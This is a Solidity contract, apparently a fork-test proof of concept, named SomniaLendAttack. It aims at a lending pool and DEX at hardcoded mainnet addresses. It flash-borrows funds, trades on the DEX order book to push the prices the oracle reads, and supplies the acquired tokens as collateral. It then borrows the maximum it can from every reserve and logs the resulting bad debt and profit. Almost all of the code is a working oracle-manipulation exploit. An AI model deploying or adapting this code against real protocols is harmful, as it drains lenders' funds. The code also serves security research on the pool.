// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/console2.sol";
import {IAaveOracle, IDreamDexSpotPool, IERC20, ISomniaLendPool, IWrappedNative, ReserveData} from "./Interfaces.sol";

/// @notice Mainnet-fork-only economic harness. It has no owner withdrawal or arbitrary-call
///         escape hatch: every state-changing route is one of the measured scenarios below.
contract SomniaLendAttack {
    address internal constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address internal constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address internal constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address internal constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
    address internal constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
    address internal constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address internal constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;

    address internal constant SOMI_USDSO = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;
    address internal constant USDC_USDSO = 0x47fD2f18426f67106DBaC82F6d21D446c5F2120b;
    address internal constant WETH_USDSO = 0xa936da11B57b50A344e1293AAaE5232885ea2bDE;
    address internal constant WBTC_USDSO = 0x25bfF6B7B5E2243424F38E75de7ab03C0522a5EA;
    address internal constant NATIVE_SENTINEL = 0x28f34DeFd2b4CB48d9eE6d89f2Be4Bc601694c00;

    uint8 internal constant ORDER_IOC = 2;
    uint8 internal constant SELF_MATCH_CANCEL_TAKER = 0;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant VARIABLE_DEBT = 2;

    enum Mode {
        NONE,
        CONTROL,
        SOMI,
        USDSO
    }

    struct Config {
        address flashAsset;
        uint256 flashAmount;
        uint256 limitBps;
        uint256 unwindLimitBps;
        uint256 borrowBps;
        bool borrowAll;
        bool unwind;
    }

    address public immutable owner;
    Mode public mode;
    Config public cfg;
    bool public hasRun;
    uint256 public flashPremium;
    uint256 public flashRepayment;
    uint256 public gasUsedApprox;

    uint256 public collateralOracleBefore;
    uint256 public collateralOracleAfterTrade;
    uint256 public debtOracleBefore;
    uint256 public debtOracleAfterTrade;
    uint256 public dexBestBefore;
    uint256 public dexBestAfter;
    uint256 public executionPriceRaw;
    uint256 public baseTraded;
    uint256 public quoteTraded;
    uint256 supplied;
    uint256 public baselineBorrowPowerBase;
    uint256 public postSupplyAvailableBorrowsBase;
    uint256 public borrowPowerIncreaseBase;
    uint256 public borrowedFlashAsset;
    uint256 public totalCollateralBase;
    uint256 public totalDebtBase;
    uint256 public healthFactor;
    uint256 public badDebtNowBase;
    uint256 public debtIfCollateralZeroBase;

    uint256 public initialUsdso;
    uint256 public initialUsdc;
    uint256 public initialWeth;
    uint256 public initialWbtc;
    uint256 public initialWsomi;
    uint256 public initialNative;
    uint256 public finalUsdso;
    uint256 public finalUsdc;
    uint256 public finalWeth;
    uint256 public finalWbtc;
    uint256 public finalWsomi;
    uint256 public finalNative;

    mapping(address => uint256) public borrowed;

    event MarketState(
        string indexed stage,
        address indexed collateral,
        uint256 collateralPrice,
        uint256 debtPrice,
        uint256 bestBid,
        uint256 bestAsk
    );
    event Execution(uint256 baseDelta, uint256 quoteDelta, uint256 executionPriceRaw, uint128 orderId);
    event Borrow(address indexed asset, uint256 amount, uint256 availableBorrowsBaseBefore);
    event RepaymentShortfall(address indexed asset, uint256 required, uint256 available, uint256 shortfall);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only test");
        _;
    }

    receive() external payable {}

    function runControl(address flashAsset, uint256 flashAmount) external onlyOwner {
        uint256 gasStart = gasleft();
        _start(Mode.CONTROL, flashAsset, flashAmount, BPS, BPS, 0, false, false);
        _logMarketState("control-pre");
        ISomniaLendPool(POOL).flashLoanSimple(address(this), flashAsset, flashAmount, "", 0);
        _finish(gasStart);
    }

    function runSomi(
        uint256 flashAmount,
        uint256 limitBps,
        uint256 unwindLimitBps,
        uint256 borrowBps,
        bool borrowAll,
        bool unwind
    ) external onlyOwner {
        uint256 gasStart = gasleft();
        _start(Mode.SOMI, USDSO, flashAmount, limitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        _logMarketState("baseline");
        ISomniaLendPool(POOL).flashLoanSimple(address(this), USDSO, flashAmount, "", 0);
        _finish(gasStart);
    }

    function runUsdso(
        uint256 flashAmount,
        uint256 limitBps,
        uint256 unwindLimitBps,
        uint256 borrowBps,
        bool borrowAll,
        bool unwind
    ) external onlyOwner {
        uint256 gasStart = gasleft();
        _start(Mode.USDSO, USDC, flashAmount, limitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        _logMarketState("baseline");
        ISomniaLendPool(POOL).flashLoanSimple(address(this), USDC, flashAmount, "", 0);
        _finish(gasStart);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == POOL, "only Pool");
        require(initiator == address(this), "bad initiator");
        require(asset == cfg.flashAsset && amount == cfg.flashAmount, "unexpected flashloan");
        require(premium == flashPremium, "premium changed");

        if (mode == Mode.CONTROL) {
            _logMarketState("control-same-tx");
        } else if (mode == Mode.SOMI) {
            _executeSomi();
        } else if (mode == Mode.USDSO) {
            _executeUsdso();
        } else {
            revert("bad mode");
        }

        _checkAndApproveRepayment(asset);
        return true;
    }

    function _start(
        Mode newMode,
        address flashAsset,
        uint256 flashAmount,
        uint256 limitBps,
        uint256 unwindLimitBps,
        uint256 borrowBps,
        bool borrowAll,
        bool unwind
    ) internal {
        require(!hasRun, "one run per harness");
        require(flashAmount > 0, "zero flashloan");
        require(limitBps > 0 && unwindLimitBps > 0 && borrowBps <= BPS, "bad bps");
        hasRun = true;
        mode = newMode;
        cfg = Config(flashAsset, flashAmount, limitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        flashPremium = (flashAmount * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / BPS;
        flashRepayment = flashAmount + flashPremium;
        initialUsdso = _bal(USDSO);
        initialUsdc = _bal(USDC);
        initialWeth = _bal(WETH);
        initialWbtc = _bal(WBTC);
        initialWsomi = _bal(WSOMI);
        initialNative = address(this).balance;
        console2.log("flash asset", flashAsset);
        console2.log("flash amount", flashAmount);
        console2.log("flash premium", flashPremium);
        console2.log("initial USDso loss coverage", initialUsdso);
        console2.log("initial USDC loss coverage", initialUsdc);
    }

    function _executeSomi() internal {
        collateralOracleBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        debtOracleBefore = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        dexBestBefore = _bestPrice(SOMI_USDSO, false);
        require(dexBestBefore > 0, "empty SOMI asks");
        _logMarketState("same-tx-pre-trade");

        (address baseToken, address quoteToken,,, uint256 tick, uint256 minQuantity, uint256 lot) =
            IDreamDexSpotPool(SOMI_USDSO).getPoolParams();
        require(baseToken == NATIVE_SENTINEL && quoteToken == USDSO, "wrong SOMI market");

        uint256 limit = _limitPrice(dexBestBefore, true, cfg.limitBps, tick);
        uint256 quantity = _affordableQuantity(SOMI_USDSO, true, limit, cfg.flashAmount, lot);
        require(quantity >= minQuantity, "SOMI qty below min");

        uint256 nativeBefore = address(this).balance;
        uint256 quoteBefore = _bal(USDSO);
        uint128 orderId = _placeIoc(SOMI_USDSO, true, limit, quantity, USDSO);
        baseTraded = address(this).balance - nativeBefore;
        quoteTraded = quoteBefore - _bal(USDSO);
        require(baseTraded > 0 && quoteTraded > 0, "no SOMI fill");
        executionPriceRaw = (quoteTraded * 1e18) / baseTraded;
        emit Execution(baseTraded, quoteTraded, executionPriceRaw, orderId);

        uint256 nativeVault = IDreamDexSpotPool(SOMI_USDSO).getWithdrawableBalance(address(this), NATIVE_SENTINEL);
        console2.log("native SOMI stuck in DEX vault", nativeVault);
        require(nativeVault == 0, "native fill not liquid");

        IWrappedNative(WSOMI).deposit{value: baseTraded}();
        collateralOracleAfterTrade = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        debtOracleAfterTrade = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        dexBestAfter = _bestPrice(SOMI_USDSO, false);
        _logOracleDelta();
        _logMarketState("same-tx-post-trade");

        _supplyAndMeasure(WSOMI, baseTraded);
        _borrowConfigured(WSOMI);
        if (cfg.unwind) _unwindLiquidSurplus();
    }

    function _executeUsdso() internal {
        collateralOracleBefore = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        debtOracleBefore = IAaveOracle(ORACLE).getAssetPrice(USDC);
        dexBestBefore = _bestPrice(USDC_USDSO, true);
        require(dexBestBefore > 0, "empty USDC bids");
        _logMarketState("same-tx-pre-trade");

        (address baseToken, address quoteToken,,, uint256 tick, uint256 minQuantity, uint256 lot) =
            IDreamDexSpotPool(USDC_USDSO).getPoolParams();
        require(baseToken == USDC && quoteToken == USDSO, "wrong USDC market");

        uint256 limit = _limitPrice(dexBestBefore, false, cfg.limitBps, tick);
        uint256 quantity = _affordableSellQuantity(USDC_USDSO, limit, cfg.flashAmount, lot);
        require(quantity >= minQuantity, "USDC qty below min");

        uint256 baseBefore = _bal(USDC);
        uint256 quoteBefore = _bal(USDSO);
        uint128 orderId = _placeIoc(USDC_USDSO, false, limit, quantity, USDC);
        baseTraded = baseBefore - _bal(USDC);
        quoteTraded = _bal(USDSO) - quoteBefore;
        require(baseTraded > 0 && quoteTraded > 0, "no USDC fill");
        executionPriceRaw = (quoteTraded * 1e6) / baseTraded;
        emit Execution(baseTraded, quoteTraded, executionPriceRaw, orderId);

        collateralOracleAfterTrade = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        debtOracleAfterTrade = IAaveOracle(ORACLE).getAssetPrice(USDC);
        dexBestAfter = _bestPrice(USDC_USDSO, true);
        _logOracleDelta();
        _logMarketState("same-tx-post-trade");

        _supplyAndMeasure(USDSO, quoteTraded);
        _borrowConfigured(USDSO);
        if (cfg.unwind) _unwindLiquidSurplus();
    }

    function _supplyAndMeasure(address collateral, uint256 amount) internal {
        supplied = amount;
        _approve(collateral, POOL, amount);
        ISomniaLendPool(POOL).supply(collateral, amount, address(this), 0);
        _approve(collateral, POOL, 0);

        uint256 ltv = ISomniaLendPool(POOL).getConfiguration(collateral).data & 0xffff;
        uint256 decimals = IERC20(collateral).decimals();
        baselineBorrowPowerBase = (amount * collateralOracleBefore * ltv) / ((10 ** decimals) * BPS);
        (,, postSupplyAvailableBorrowsBase,,,) = ISomniaLendPool(POOL).getUserAccountData(address(this));
        borrowPowerIncreaseBase = postSupplyAvailableBorrowsBase > baselineBorrowPowerBase
            ? postSupplyAvailableBorrowsBase - baselineBorrowPowerBase
            : 0;
        console2.log("supplied collateral", amount);
        console2.log("reserve LTV bps", ltv);
        console2.log("baseline borrow power at pre-trade oracle", baselineBorrowPowerBase);
        console2.log("actual post-supply available borrow base", postSupplyAvailableBorrowsBase);
        console2.log("borrow power increase base", borrowPowerIncreaseBase);
    }

    function _borrowConfigured(address collateral) internal {
        _borrowMaximum(cfg.flashAsset, collateral);
        borrowedFlashAsset = borrowed[cfg.flashAsset];
        if (!cfg.borrowAll) return;

        address[] memory reserves = ISomniaLendPool(POOL).getReservesList();
        for (uint256 i; i < reserves.length; ++i) {
            address asset = reserves[i];
            if (asset == collateral || asset == cfg.flashAsset) continue;
            _borrowMaximum(asset, collateral);
        }
    }

    function _borrowMaximum(address asset, address collateral) internal {
        require(asset != collateral, "cannot borrow collateral here");
        (,, uint256 availableBase,,,) = ISomniaLendPool(POOL).getUserAccountData(address(this));
        availableBase = (availableBase * cfg.borrowBps) / BPS;
        uint256 price = IAaveOracle(ORACLE).getAssetPrice(asset);
        require(price > 0, "zero debt price");
        uint256 amount = (availableBase * (10 ** IERC20(asset).decimals())) / price;
        ReserveData memory reserve = ISomniaLendPool(POOL).getReserveData(asset);
        uint256 cash = IERC20(asset).balanceOf(reserve.aTokenAddress);
        if (amount > cash) amount = cash;
        emit Borrow(asset, amount, availableBase);
        console2.log("maximum candidate borrow asset", asset);
        console2.log("maximum candidate borrow amount", amount);
        console2.log("reserve aToken cash", cash);
        if (amount == 0) return;
        ISomniaLendPool(POOL).borrow(asset, amount, VARIABLE_DEBT, 0, address(this));
        borrowed[asset] += amount;
    }

    function _unwindLiquidSurplus() internal {
        _unwindAsset(USDC, USDC_USDSO, 6);
        _unwindAsset(WETH, WETH_USDSO, 18);
        _unwindAsset(WBTC, WBTC_USDSO, 8);
        _logMarketState("same-tx-post-unwind");
    }

    function _unwindAsset(address asset, address dexPool, uint8 baseDecimals) internal {
        uint256 balance = _bal(asset);
        uint256 initial = asset == USDC ? initialUsdc : asset == WETH ? initialWeth : initialWbtc;
        uint256 reserve = initial;
        if (asset == cfg.flashAsset) reserve += flashRepayment;
        if (balance <= reserve) {
            console2.log("no liquid surplus to unwind", asset);
            return;
        }
        uint256 surplus = balance - reserve;
        uint256 bestBid = _bestPrice(dexPool, true);
        if (bestBid == 0) {
            console2.log("unwind blocked: empty bids", asset);
            return;
        }
        (,,,, uint256 tick, uint256 minQuantity, uint256 lot) = IDreamDexSpotPool(dexPool).getPoolParams();
        uint256 quantity = (surplus / lot) * lot;
        if (quantity < minQuantity) {
            console2.log("unwind blocked: below min quantity", surplus);
            return;
        }
        uint256 limit = _limitPrice(bestBid, false, cfg.unwindLimitBps, tick);
        uint256 quoteBefore = _bal(USDSO);
        uint256 baseBefore = _bal(asset);
        uint128 orderId = _placeIoc(dexPool, false, limit, quantity, asset);
        uint256 sold = baseBefore - _bal(asset);
        uint256 proceeds = _bal(USDSO) - quoteBefore;
        uint256 realizedPrice = sold == 0 ? 0 : (proceeds * (10 ** baseDecimals)) / sold;
        console2.log("unwind asset", asset);
        console2.log("unwind base sold", sold);
        console2.log("unwind USDso proceeds", proceeds);
        console2.log("unwind execution price", realizedPrice);
        emit Execution(sold, proceeds, realizedPrice, orderId);
    }

    function _placeIoc(address dexPool, bool isBid, uint256 limit, uint256 quantity, address expectedInput)
        internal
        returns (uint128 orderId)
    {
        (address input, uint256 required,) =
            IDreamDexSpotPool(dexPool).getAutoPullRequirement(address(this), isBid, limit, quantity, 0);
        require(input == expectedInput, "unexpected DEX input");
        require(input != NATIVE_SENTINEL, "native input not funded here");
        require(_bal(input) >= required, "insufficient DEX input");
        _approve(input, dexPool, required);
        uint64 expiry = uint64((block.timestamp + 300) * 1e9);
        (bool success, uint128 returnedId) = IDreamDexSpotPool(dexPool)
            .placeOrder(isBid, 0, limit, quantity, expiry, ORDER_IOC, SELF_MATCH_CANCEL_TAKER, address(0), 0);
        _approve(input, dexPool, 0);
        require(success, "DEX order rejected");
        return returnedId;
    }

    function _affordableQuantity(address dexPool, bool isBid, uint256 limit, uint256 budget, uint256 lot)
        internal
        view
        returns (uint256 quantity)
    {
        quantity = ((budget * 1e18) / limit / lot) * lot;
        for (uint256 i; i < 4 && quantity > 0; ++i) {
            (, uint256 required,) =
                IDreamDexSpotPool(dexPool).getAutoPullRequirement(address(this), isBid, limit, quantity, 0);
            if (required <= budget) return quantity;
            quantity = (((quantity * budget) / required) / lot) * lot;
        }
        (, uint256 finalRequired,) =
            IDreamDexSpotPool(dexPool).getAutoPullRequirement(address(this), isBid, limit, quantity, 0);
        require(finalRequired <= budget, "cannot fund DEX order");
    }

    function _affordableSellQuantity(address dexPool, uint256 limit, uint256 budget, uint256 lot)
        internal
        view
        returns (uint256 quantity)
    {
        quantity = (budget / lot) * lot;
        for (uint256 i; i < 4 && quantity > 0; ++i) {
            (, uint256 required,) =
                IDreamDexSpotPool(dexPool).getAutoPullRequirement(address(this), false, limit, quantity, 0);
            if (required <= budget) return quantity;
            quantity = (((quantity * budget) / required) / lot) * lot;
        }
        (, uint256 finalRequired,) =
            IDreamDexSpotPool(dexPool).getAutoPullRequirement(address(this), false, limit, quantity, 0);
        require(finalRequired <= budget, "cannot fund DEX sell");
    }

    function _limitPrice(uint256 best, bool isBid, uint256 bps, uint256 tick) internal pure returns (uint256) {
        uint256 raw = (best * bps) / BPS;
        uint256 limit = isBid ? ((raw + tick - 1) / tick) * tick : (raw / tick) * tick;
        require(limit > 0, "zero limit price");
        return limit;
    }

    function _bestPrice(address dexPool, bool isBid) internal view returns (uint256) {
        IDreamDexSpotPool.BookLevel[] memory levels = IDreamDexSpotPool(dexPool).getBookLevels(isBid, 1);
        return levels.length == 0 ? 0 : levels[0].price;
    }

    function _checkAndApproveRepayment(address asset) internal {
        uint256 balance = _bal(asset);
        if (balance < flashRepayment) {
            emit RepaymentShortfall(asset, flashRepayment, balance, flashRepayment - balance);
            console2.log("FLASH REPAYMENT SHORTFALL", flashRepayment - balance);
        }
        // Aave pulls amount + premium immediately after this callback returns. If the attack
        // cannot fund it, the whole zero-seed transaction reverts here, as it must.
        _approve(asset, POOL, flashRepayment);
    }

    function _finish(uint256 gasStart) internal {
        _logMarketState("final");
        finalUsdso = _bal(USDSO);
        finalUsdc = _bal(USDC);
        finalWeth = _bal(WETH);
        finalWbtc = _bal(WBTC);
        finalWsomi = _bal(WSOMI);
        finalNative = address(this).balance;
        // EVM gasleft delta only: excludes intrinsic gas/refunds and is not deducted from token P&L.
        gasUsedApprox = gasStart - gasleft();
        console2.log("approximate execution gas (not receipt gas)", gasUsedApprox);
        console2.log("tx gasprice (EOA pays gas, not this contract)", tx.gasprice);

        (totalCollateralBase, totalDebtBase,,,, healthFactor) = ISomniaLendPool(POOL).getUserAccountData(address(this));
        badDebtNowBase = totalDebtBase > totalCollateralBase ? totalDebtBase - totalCollateralBase : 0;
        debtIfCollateralZeroBase = totalDebtBase;

        console2.log("FINAL USDso", finalUsdso);
        console2.log("FINAL USDC.e", finalUsdc);
        console2.log("FINAL WETH", finalWeth);
        console2.log("FINAL WBTC", finalWbtc);
        console2.log("FINAL WSOMI wallet", finalWsomi);
        console2.log("FINAL native SOMI", finalNative);
        console2.log("NET USDso delta", netUsdsoDelta());
        console2.log("NET USDC delta", netUsdcDelta());
        console2.log("remaining collateral base", totalCollateralBase);
        console2.log("remaining debt base", totalDebtBase);
        console2.log("actual bad debt now base", badDebtNowBase);
        console2.log("debt if collateral becomes worthless", debtIfCollateralZeroBase);
        console2.log("health factor", healthFactor);
    }

    function _logOracleDelta() internal {
        console2.log("collateral oracle before", collateralOracleBefore);
        console2.log("collateral oracle after DEX", collateralOracleAfterTrade);
        console2.log("debt oracle before", debtOracleBefore);
        console2.log("debt oracle after DEX", debtOracleAfterTrade);
        console2.log("DEX execution price", executionPriceRaw);
        console2.log("collateral oracle delta bps", _deltaBps(collateralOracleBefore, collateralOracleAfterTrade));
        console2.log("debt oracle delta bps", _deltaBps(debtOracleBefore, debtOracleAfterTrade));
    }

    function _logMarketState(string memory stage) internal {
        address collateral = mode == Mode.SOMI ? WSOMI : USDSO;
        address debt = cfg.flashAsset;
        uint256 bestBid;
        uint256 bestAsk;
        if (mode == Mode.SOMI) {
            bestBid = _bestPrice(SOMI_USDSO, true);
            bestAsk = _bestPrice(SOMI_USDSO, false);
        } else if (mode == Mode.USDSO) {
            bestBid = _bestPrice(USDC_USDSO, true);
            bestAsk = _bestPrice(USDC_USDSO, false);
        }
        uint256 collateralPrice = mode == Mode.CONTROL ? 0 : IAaveOracle(ORACLE).getAssetPrice(collateral);
        uint256 debtPrice = IAaveOracle(ORACLE).getAssetPrice(debt);
        console2.log("stage", stage);
        console2.log("best bid raw", bestBid);
        console2.log("best ask raw", bestAsk);
        console2.log("collateral oracle", collateralPrice);
        console2.log("debt oracle", debtPrice);
        emit MarketState(stage, collateral, collateralPrice, debtPrice, bestBid, bestAsk);
    }

    function _deltaBps(uint256 beforeValue, uint256 afterValue) internal pure returns (int256) {
        if (beforeValue == 0) return 0;
        if (afterValue >= beforeValue) {
            return int256(((afterValue - beforeValue) * BPS) / beforeValue);
        }
        return -int256(((beforeValue - afterValue) * BPS) / beforeValue);
    }

    function _approve(address token, address spender, uint256 amount) internal {
        require(IERC20(token).approve(spender, amount), "approve failed");
    }

    function _bal(address token) internal view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function suppliedCollateral() external view returns (uint256) {
        return supplied;
    }

    function netUsdsoDelta() public view returns (int256) {
        return int256(finalUsdso) - int256(initialUsdso);
    }

    function netUsdcDelta() public view returns (int256) {
        return int256(finalUsdc) - int256(initialUsdc);
    }

    function netWethDelta() external view returns (int256) {
        return int256(finalWeth) - int256(initialWeth);
    }

    function netWbtcDelta() external view returns (int256) {
        return int256(finalWbtc) - int256(initialWbtc);
    }
}
